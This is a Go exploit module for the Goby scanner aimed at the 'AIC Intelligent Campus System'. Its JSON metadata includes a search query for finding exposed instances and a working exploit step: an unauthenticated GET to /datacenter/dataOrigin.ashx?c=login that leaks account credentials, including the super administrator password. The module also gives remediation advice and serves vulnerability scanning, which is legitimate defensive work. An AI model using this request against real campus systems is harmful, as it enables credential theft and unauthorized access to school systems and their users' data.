package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "AIC Intelligent Campus System Password Leak",
    "Description": "Divulge super administrator password",
    "Impact": "AIC Intelligent Campus System Password Leak",
    "Recommendation": "<p>1. First, delete the leaked account password interface.</p><p>2. Contact the manufacturer to upgrade the system.</p><p>3. Modify the weak password.</p>",
    "Product": "AIC Intelligent Campus System",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "AIC智能校园系统信息泄露漏洞",
            "Description": "<p>AIC智能校园系统是广州瑾祺信息科技有限公司开发的一套智能校园管理系统。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">AIC智能校园系统存在信息泄露漏洞，攻击者可以构造<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">殊URL地址，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">读取用户的账号和密码，从而登录到系统。</span></span></span><br></p>",
            "Impact": "<p><span style=\"font-size: 16px;\"><span style=\"font-size: 16px;\">AIC智能校园系统存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取到用户的账号和密码。</span></span><br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://aic-it.com/\">http://aic-it.com/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "AIC Intelligent Campus System",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "AIC Intelligent Campus System Password Leak",
            "Description": "Divulge super administrator password",
            "Impact": "AIC Intelligent Campus System Password Leak",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1. First, delete the leaked account password interface.</span><br></p><p>2. Contact the manufacturer to upgrade the system.</p><p>3. Modify the weak password.</p>",
            "Product": "AIC Intelligent Campus System",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "title=\"AIC智能校园系统\"",
    "GobyQuery": "title=\"AIC智能校园系统\"",
    "Author": "fengyue",
    "Homepage": "http://aic-it.com/",
    "DisclosureDate": "2021-05-22",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/datacenter/dataOrigin.ashx?c=login",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "卡号",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/datacenter/dataOrigin.ashx?c=login",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "卡号",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "查看",
            "type": "input",
            "value": "点击验证",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
